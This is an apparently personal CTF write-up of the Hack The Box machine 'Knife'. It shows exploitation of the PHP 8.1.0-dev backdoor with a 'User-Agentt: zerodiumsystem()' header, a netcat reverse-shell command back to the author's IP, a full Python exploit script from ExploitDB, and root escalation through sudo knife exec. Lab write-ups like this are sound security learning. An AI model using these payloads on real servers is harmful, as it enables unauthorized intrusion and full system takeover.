---
title: "Knife"
author: "Me"
date: "June 18, 2021"
output: html_document
---

# Knife

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_knife_desc.png){: height="400px" width = 600px"}
</div>

**Ports/services exploited:** 80/PHP 8.1.0-dev\\
**Tools:** dirb, nikto\\
**Techniques:** RCE, reverse shell\\
**Keywords:** CVE, Knife, Chef, backdoor\\


## 1. Port scanning
{:style="color:DarkRed; font-size: 170%;"}

As usual, let's perform a nmap scan with the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan.

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_knife_nmap.png)
</div>

There's only SSH and a web server running.

## 2. Find and exploit vulnerabilities
{:style="color:DarkRed; font-size: 170%;"}

We will start by browsing to the web page and see what it contains:

<div class="img_container">
![website]({{https://jsom1.github.io/}}/_images/htb_knife_site.png){: height="415px" width = 625px"}
</div>

There are a few tabs on the page, but none of them are clickable. The next obvious thing we want to do is bruteforce directories, and we'll use dirb for that:

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_knife_dirb.png)
</div>

Dirb didn't find anything interesting (we can't access */server-status*). It's not the first time nothing stands out rapidly, so we might want to try other wordlists and/or other tools.
Let's try with dirb and another wordlist with the following syntax:

````
sudo dirb http://10.10.10.242/ /usr/share/dirb/wordlists/big.txt
``````

That doesn't reveal anything either. We can try with another tool like wfuzz:

`````
sudo wfuzz --hc 404 -w /usr/share/wordlists/rockyou.txt http://10.10.242/FUZZ
``````

We filter the output so that it doesn't return 404 errors. The result seems to contain only false positives as we see in the image below:

<div class="img_container">
![wfuzz]({{https://jsom1.github.io/}}/_images/htb_knife_wfuzz.png)
</div>

It seems that words starting with either "#" or a digit (at least 1) work. I stopped the scan quicly since it would take a very long time and does't seem to be the right way to go.
It's odd that we still haven't anything to continue, but there are a few things we can still try. Let's perform a full TCP scan as well as a top 1000 ports UDP scan. The syntax is the following:

````
sudo nmap -sV -sC -p 1-65535 10.10.10.242
sudo nmap -sU 10.10.10.242
`````

Both those scans bring nothing... We saw the versions of Apache (httpd 2.4.41) and ssh (OpnSSH 8.2p1) in the output of nmap. We can search if there is any existing module in Metasploit for those services and versions:

````
searchsploit httpd | grep linux
searchsploit openSSH
`````

There are some existing exploits but they don't look very promising: it's either not for the good version or not what we want (DoS, buffer overflows, ...). We can also inspect the webpage to see if we find information about php (we saw *index.php* in the output of dirb) or any other useful information. We can simply right-click on the page and click on *inspect element*. Then we can look at the different tabs, see what kind of php scripts there are, inspect the traffic between the server and our client, and so on... Sadly, there is nothing there either.

I'm not used to it, but we could try to use **Nikto**. This tool allows to scan a web server to detect potential vulnerabilities:

<div class="img_container">
![nikto]({{https://jsom1.github.io/}}/_images/htb_knife_nikto.png)
</div>

We see the version of php, which is 8.1.0-dev. The fact that it's a dev version means that it could be vulnerable somehow. I didn't find it on the webpage information, but I think this info should be somewhere... Let's try to find it for the sake of curiosity! We know we have to look at headers, so it's pretty straightforward:

<div class="img_container">
![Finding php version]({{https://jsom1.github.io/}}/_images/htb_knife_headers.png){: height="400px" width = 600px"}
</div>

And there it is! Next time I'll have to check more carefuly... Anyways, we'll  now search for vulnerabilities for this version, but first let's look at what CGI directories are. Nikto didn't find any, but I don't know what it is so here's a short description: cgi-bin ("Commom Gateway Interface") is a directory that contains stored Perl or compiled files. Those files are treated as programs instead of HTML pages or images, and will be run by the server instead of displayed normally. In short, it's an interface used by HTTP servers.

Simply Googling "php 8.1.0-dev exploit" returns many pages which mention a **backdoor remote command injection**. That might finally be our way in!\\
Apparently, the version 8.1.0-dev was released with a backdoor on March 28th, 2021. Someone was able to push two malicious commits into the *php-src-repo*. They were quickly discovered and removed, but might still be present if the version wasn't patched.

The exploit consists in adding a new header *"User-agentt":"zerodiumsystem();"* (yes with two "t"). We can issue a command in the *zerodiumsystem()* part, for example *zerodiumsystem("ls")* to list files and directories.\\
A well known tool to tamper a request is Burp, and we can use it to check if it works. We fist make sure the proxy is configured: in the browser, we go to *Preferences* -> *Network Settings* -> *Settings* and tick *Manual proxy configuration*. We set the value of HTTP Proxy to 127.0.0.1 and the port to 8080.\\
We can then open Burp and refresh the webpage in the browser. Burp should intercept the request, and we can modify it as follows:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp1.png)
</div>

Once we added the malicious header, we can forward the request. The server processes it and responds to us. We can analyze the response to see if it worked:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp2.png)
</div>

The server indeed returned the output of the *ls* command, proving we have remote code execution! From there it should be fairly easy to get a reverse shell... We start by looking at our ip (*sudo ifconfig tun0*). We then start a listener on port 4444 (*sudo nc -nlvp 4444*) and replace the *ls* command with *nc -nv 10.10.14.6 4444*:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp3.png)
</div>

We forward the packet and see if the server connects back to us:

<div class="img_container">
![revshell]({{https://jsom1.github.io/}}/_images/htb_knife_revsh.png)
</div>

It does indeed, but the shell is not responsive... There could be another way to get the user flag: we can issue hostname, and then write a command to read the file in the user's home. We start by getting the hostname:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp4.png)
</div>

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp5.png)
</div>

We see the user james. Because the user flag (*user.txt*) is always in the user's home directory in HtB CTFs, we can just *cat* the content of that file to retrieve the hash:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp6.png)
</div>

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp7.png)
</div>

And that's it for the user! It's not a very elegant solution, but it's working so this is what matters... In its early stages, hacking consisted of writing clean, concise and elegant code, but nowadays it's more about finding tricks to get what we want. So it's kind of ok this way!\\
With that being said, it would still be helpful to get a shell as james. The reason is that it would be much more simple for enumation. We could of course do it the way we got the user flag, but that would be tedious as it means sending and tampering a request for each command...
Looking back at Google, there are different python PoCs that exploit that vulnerability. Here's the code of one hosted on ExploitDB (https://www.exploit-db.com/exploits/49933). See the link for the details:

````
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
``````

This script won't give us a reverse shell but it simplifies the use of the *zerodiumsystem()* command.
We don't have to alter the request's header anymore and will be able to enter commands interactively. Let's try it out. We download or copy this script on our Kali machine (I named it *php_8.1.0-dev-backdoor.py*) and execute it:

<div class="img_container">
![shell]({{https://jsom1.github.io/}}/_images/htb_knife_shell.png)
</div>

We now have a simple "shell" in which we can use some basic commands, but we can't change directory (we can still see content with commands such as *ls /var/www/html*, but it's not very convenient). Let's still perform a very basic manual enumeration to see if we can get something. The reason is that I tried to use another exploit supposed to give a proper reverse shell, but it didn't work. Among the few simple commands we can try, it is always good to check what the current can do with the command *sudo -l*:

<div class="img_container">
![james permissions]({{https://jsom1.github.io/}}/_images/htb_knife_sudol.png)
</div>

We see he can run the command */usr/bin/knife* as root, without providing a password. We can inspect this file with the command *cat /usr/bin/knife*. I'm not sure about what this script does. There are many ruby gems listed, and it seems like it performs dependencies checks.\\
I'm not sure but it doesn't look suspicious so I'll just try to run that script as sudo:

<div class="img_container">
![knife]({{https://jsom1.github.io/}}/_images/htb_knife_knife.png)
</div>

We have to provide one sub-command among those listed on the image. I tried for example *sudo ./usr/bin/knife config show* and *sudo ./usr/bin/knife user list*. It works but it's not very useful. There are commands for Google services, Azure, SSH, SSL, and so on... In doesn't look like to be a custom script but rather a tool. Let's google */usr/bin/knife* to see if we can find more info.\\
Apparently, **Knife** is a command-line DevOps tool that provides an interface between a local chef-repo and the **Chef** Infra Server. I didn't know what Chef was, so here's what I found: Chef is a configuration management tool that offers a means of defining infrastructure as code that can be deployed onto multiple servers. It also includes automatic configuration and maintenance. It supports various platforms such as AWS, GCP, OpenStack, and so on.

After seearching in the doc (https://docs.chef.io/workstation/knife_exec/), I found we can run ruby scripts or ruby code with the syntax *knife exec /path/to/script_file* or *knife exec -E 'ruby code'*. Let's try to get a reverse shell:

<div class="img_container">
![fail]({{https://jsom1.github.io/}}/_images/htb_knife_fail.png)
</div>

I looked for this error but couldn't find anything. Could it be because the command is passed through *zerodiumsystem()* and it can't work this way? Maybe we should get back to our initial attempt of getting a reverse shell via the *zerodiumsystem()* command and try with another payload:

<div class="img_container">
![Burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp8.png)
</div>

<div class="img_container">
![Reverse shell!]({{https://jsom1.github.io/}}/_images/htb_knife_reversesh.png)
</div>

And this time we've got a proper reverse shell! There's a problem though... Every character we type gets duplicated. Fortunately here's a fix (https://forum.hackthebox.eu/discussion/935/double-characters-in-shell) that we can try:

<div class="img_container">
![fix shell!]({{https://jsom1.github.io/}}/_images/htb_knife_fix.png)
</div>

I'm not used to that fix and there's a point when we type and nothing is displayed on the screen. It's a bit messy but it worked in the end as we can see with *ls*. Let's try again some of the commands we tried with *knife* in the previous "shell":

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_knife_root.png)
</div>

It took a few tries to get the right command, but we're finally in as root! It's weird though because I couldn't see what I was typing in the shell. Maybe it is because of the previous command that I executed blindly (the one to fix duplicated characters). Anyways, we've got what we wanted!

<ins>**My thoughts**</ins>

I really enjoyed this machine for various reasons. First, there wasn't much to start with and yet it was "hard" to figure out what to do! On some machines there are up to 10 open ports and that potentially means 9 rabbit holes. Here there was only one at first (we rarely if ever start with SSH) so we knew where to go but not how.\\
Then, even though this machine wasn't particularly described as "real", I felt like it was way more realistic than some other machines on HtB. I can totally imagine a server running an unpatched version of HTP, and they way of exploiting the backdoor was fun!\\
Finally, I learned a little bit about Chef, Knife and this PHP 8.1.0-dev vulnerability. I'm happy to add this to my toolbox!

I should remember to try different reverse shell payloads in the upcoming boxes. Here I only tried one with netcat and took a different path when it failed. If we feel that something *should work* but doesn't, it might be clever to try with another tool, another wordlist, another payload, and so on.
